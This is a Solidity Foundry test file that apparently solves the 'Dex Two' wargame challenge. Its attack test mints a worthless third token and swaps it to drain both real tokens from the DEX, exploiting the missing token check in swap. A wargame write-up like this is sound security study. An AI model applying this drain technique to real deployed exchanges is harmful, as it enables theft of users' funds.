// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../../src/dexTwo/DexTwo.sol";

contract DexTwoTest is Test {
    DexTwo public dex;
    address public dexAddy;
    SwappableTokenTwo public token1;
    address public token1Addy;
    SwappableTokenTwo public token2;
    address public token2Addy;
    SwappableTokenTwo public token3;
    address public token3Addy;
    address player = makeAddr("player");

    function setUp() public {
        dex = new DexTwo();
        dexAddy = address(dex);
        token1 = new SwappableTokenTwo(dexAddy, "token1", "token1", 110);
        token1Addy = address(token1);
        token2 = new SwappableTokenTwo(dexAddy, "token2", "token2", 110);
        token2Addy = address(token2);
        dex.setTokens(token1Addy, token2Addy);
        dex.approve(dexAddy, type(uint256).max);
        // muevo 100 al dex
        dex.add_liquidity(token1Addy, 100);
        dex.add_liquidity(token2Addy, 100);
        // muevo 10 al player
        token1.transfer(player, 10);
        token2.transfer(player, 10);
        // prank player
        vm.startPrank(player);
        token3 = new SwappableTokenTwo(dexAddy, "token3", "token3", 500);
        token3Addy = address(token3);
        token3.transfer(dexAddy, 10);
    }

    function test_DexTwoCreation() public {
        assertEq(dex.token1(), token1Addy);
        assertEq(dex.token2(), token2Addy);
        assertEq(token1.balanceOf(dexAddy), 100);
        assertEq(token1.balanceOf(player), 10);
        assertEq(token2.balanceOf(dexAddy), 100);
        assertEq(token2.balanceOf(player), 10);
        assertEq(token3.balanceOf(dexAddy), 10);
        assertEq(token3.balanceOf(player), 490);
    }

    function test_DexTwoAttack() public {
        token3.approve(dexAddy, type(uint256).max);
        dex.swap(token3Addy, token1Addy, 10);
        assertEq(token1.balanceOf(dexAddy), 0);
        dex.swap(token3Addy, token2Addy, 20);
        assertEq(token2.balanceOf(dexAddy), 0);
    }
}
